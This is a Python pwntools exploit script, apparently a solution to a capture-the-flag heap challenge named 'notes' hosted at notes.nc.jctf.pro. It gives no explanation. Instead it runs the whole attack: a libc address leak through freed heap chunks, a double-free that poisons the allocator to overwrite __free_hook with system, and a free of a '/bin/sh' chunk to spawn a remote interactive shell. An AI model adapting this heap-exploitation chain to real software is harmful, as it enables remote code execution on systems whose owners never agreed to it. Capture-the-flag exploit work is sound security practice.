from pwn import *

BEDUG = False

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

if (BEDUG == True):
    io = process('./notes')
    gdb.attach(io)
else:
    io = remote('notes.nc.jctf.pro', 5001)

io.sendlineafter(b'10): ', b'-1')

def add(size, dat):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'size: ', str(size).encode('utf-8'))
    io.sendafter(b'content: ', dat)

def rm(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'note id: ', str(idx).encode('utf-8'))

def c(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'note id: ', str(idx).encode('utf-8'))

for i in range(8):
    add(0x100, b'OK')

add(0x18, b'/bin/sh')
for i in range(8):
    rm(i)
add(0x18, b'A')
c(9)
libc.address = u64(io.recv(6)+b'\0\0') - 0x1ecc41
log.info('Libc: '+hex(libc.address))
add(0xe0, b'FILL')
for i in range(10):
    add(0x68, b'OK')

for i in range(9):
    rm(11+i)

rm(11+7)

for i in range(7):
    add(0x68, b'OK')

add(0x68, p64(libc.sym['__free_hook']))
add(0x68, b'OK')
add(0x68, b'OK')
add(0x68, p64(libc.sym['system']))
rm(8)

io.interactive()
